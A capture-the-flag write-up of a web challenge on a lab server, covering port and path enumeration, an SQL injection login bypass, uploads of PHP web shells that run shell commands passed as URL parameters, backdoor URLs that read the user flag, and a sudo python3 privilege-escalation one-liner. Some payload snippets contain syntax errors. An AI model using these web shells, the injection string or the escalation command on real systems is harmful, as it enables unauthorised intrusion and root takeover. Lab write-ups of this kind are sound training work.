---
cssclasses:
  - jbm-note
Date: 2026-05-16
---
# RCE Challenge

| **Target**            | *139.144.167.25*            |
| --------------------- | --------------------------- |
| Date                  | 15/5/2026                   |
| Main attack type      | File upload vulnerability   |
| Secondary attack type | Remote code execution (RCE) |
| Tools:                | Burpsuite, NMAP, FUFF       |
| Criticality:          | CVE **9.0**-**10.0**        |

---
# **RESULTS**
---
## Flags found
- *flag{web_sqli_cmd_inject_upload}*
- *flag{root_via_sudo_python3}*

---
# Preparation
---
## Making the PHP payload

`cat1.php` - Initial test file
```PHP
<?php echo file_get_contents("/home/")?>
```

`catpicture2.php.jpg` - Filter test file
```PHP
<?php if(isset($_GET('cmd'))) { $cmd = $_GET('cmd'); echo (system($cmd)); } ?>
```

`catpicture3.PHP` - Second filter test file
```PHP
<?php if(isset($_GET('pic'))) { $cmd = $_GET('pic'); echo (system($cmd)); } ?>
```

`/usr/share/webshells/php/` - Main test:
```PHP
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

---
# Initial investigation/enumeration
---
## **Enumeration**
### FUFF results
![[INSA-CHALLENGE-2026-5-16-FUFF_RESULTS.png]]
When scanning for open endpoints with `fuff` the following results are shown:
```
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1755ms]
                        [Status: 200, Size: 882, Words: 178, Lines: 28, Duration: 1774ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5271ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5295ms]
index.php               [Status: 200, Size: 882, Words: 178, Lines: 28, Duration: 234ms]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 203ms]
```

## NMAP results
Using NMAP only shows that port 22 (`OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)`) and port 80 (`)

## **Vulnerability scanning**
### SQLI
When greeted with the sites login page, we can immediately use SQL injection to login to the admin panel.
payload: `admin' --`

Checking the stored cookie (`PHPSESSID`) signals that the server is running on PHP.

### Web exploration
![[INSA-CHALLENGE-2026-5-16-Admin_file_upload_panel.png]]
Exploring the admin panel after login shows a file explorer that allows for file uploads.

---
# Exploiting and  Investigation
---

## File upload -> Web Shell
![[INSA-CHALLENGE-2026-5-16-PHP_PAYLOAD_FLAG.png]]
Exploring the site reveals a file upload vulnerability which can be exploited using Burpsuite to bypass the **Content-Type** check.

Using the preconfigured payload (`/usr/share/payloads/php`), when uploaded to run a `ls /home/labusr/` command it returns `user.txt`.
```URL
http://139.144.167.25/uploads/yididiya_mandefro_simple_backdor.php?cmd=ls%20%2fhome%2flabuser
```

using `cat` on the file returns the flag (This flag could also be gained through SSH): `flag{web_sqli_cmd_inject_upload}`
```URL
http://139.144.167.25/uploads/yididiya_mandefro_simple_backdor.php?cmd=cat%20%2fhome%2flabuser%2fuser.txt
```

## SSH privilege escalation
![[INSA-CHALLENGE-2026-5-16-ROOT_USER_FLAG.png]]
Running `sudo -l` shows the `labuser` can run python3 binary. By using the `GTFObins` common vulnerabilities list, we can find a python3 privilege escalation script.

```Bash
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
```

Running `whoami` shows that we got root access,
Going to the root folder allows access to a root.txt file,
Using `cat root.txt` gives us the flag:
`flag{root_via_sudo_python3}`